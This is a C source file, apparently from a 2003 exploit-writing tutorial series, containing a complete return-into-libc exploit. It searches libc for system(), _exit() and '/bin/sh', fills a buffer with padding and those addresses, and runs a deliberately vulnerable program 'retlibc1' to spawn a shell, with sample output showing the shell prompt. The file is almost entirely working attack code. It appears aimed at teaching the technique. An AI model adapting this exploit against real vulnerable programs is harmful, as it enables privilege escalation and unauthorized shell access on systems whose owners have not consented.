/*
 * $Id: retlibc1-ex5.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex5.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit shows the basic return-into-libc technique, changing the
 * execution flow of an abo1.c-like vulnerable program. This time we
 * implemented a simple search() function to find system() and _exit()
 * addresses in libc and another search_str() function to find "/bin/sh"
 * address (see Solar Designer's /usr/bin/lpr buffer overflow exploit).
 *
 * Tested on Linux 2.4.20-rc4 with gcc-2.95.4. For newer compilers, you          * probably have to use a bigger buffer and pad A's to (67 * 4) = 268.
 *
 * $ ./retlibc1-ex5 
 * Using system() address: 0x4005f590
 * Using _exit() address: 0x400bae90
 * Using /bin/sh address: 0x4012276d
 * sh-2.05a$ 
 */

// Compile with the same shared libs of the vulnerable program, using:
// $ gcc retlibc1-ex5.c -o retlibc1-ex5 `ldd retlibc1 \
// | grep '^.lib' | sed -e 's/^.lib\([_0-9a-zA-Z]*\)\.so.*/-l\1/'` -ldl

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <signal.h>
#include <setjmp.h>

#define BUF	273			// (65 * 4) + (4 * 3) + 1
#define VULN	"./retlibc1"		// the vulnerable program
#define	SHELL	"/bin/sh"		// the "/bin/sh" string

int _addr, step;
jmp_buf env;

void fault() /* SIGSEGV handler */
{
	if (step < 0)
		/* change the search direction */
		longjmp(env, 1);
	else {
		fprintf(stderr, "sorry, pattern not found\n");
		exit(-1);
	}
	return;
}

int search_str(char *pattern, int start) /* search for a string in libc */
{
	/* to avoid specifying the actual address that libc is mmap()ed to
	 * we search from the specified start address in both directions
	 * until a SIGSEGV is generated */

	if (setjmp(env))
		step = 1;
	else
		step = -1;

	_addr = start;

	/* install SIGSEGV handler and begin search */
	signal(SIGSEGV, fault);

	do
		while ( memcmp((void *)_addr, pattern, strlen(pattern) + 1) ) 
			_addr += step;
	/* no need to check for 0xff000000 match this time */
	while (!(_addr & 0xff) || !(_addr & 0xff00) || !(_addr & 0xff0000));

	/* uninstall SIGSEGV handler and end search */
	signal(SIGSEGV, SIG_DFL);

	return(_addr);
}

int search(char *pattern) /* search for a symbol in libc */
{
	void *p;
	int addr;

	/* dlopen() the main program */
	if ( !(p = dlopen(NULL, RTLD_LAZY)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* search for the pattern */
	if ( !(addr = (int)dlsym(p, pattern)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* check the address for the presence of a 0x0 */
	if ( !(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
			!(addr & 0xff000000) ) {
		fprintf(stderr, "the address of %s contains a 0x0!\n", pattern);
		exit(-1);
	}

	dlclose(p);
	return(addr);
}

int main()
{
	char buf[BUF];

	int system = search("system"); 
	int exit = search("_exit"); /* can't use exit() */
	int shell = search_str(SHELL, system);

	int *p = (int *)buf;

	fprintf(stderr, "Using system() address: %p\n", system);
	fprintf(stderr, "Using _exit() address: %p\n", exit);
	fprintf(stderr, "Using /bin/sh address: %p\n", shell);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = system;	/* system() address in libc */
	*p++ = exit;	/* _exit() address in libc */
	*p++ = shell;	/* "/bin/sh" address in libc */
	*p = 0x0;

	/* run the vulnerable program */
	execl(VULN, VULN + 2, buf, NULL);
	perror("execl");
}
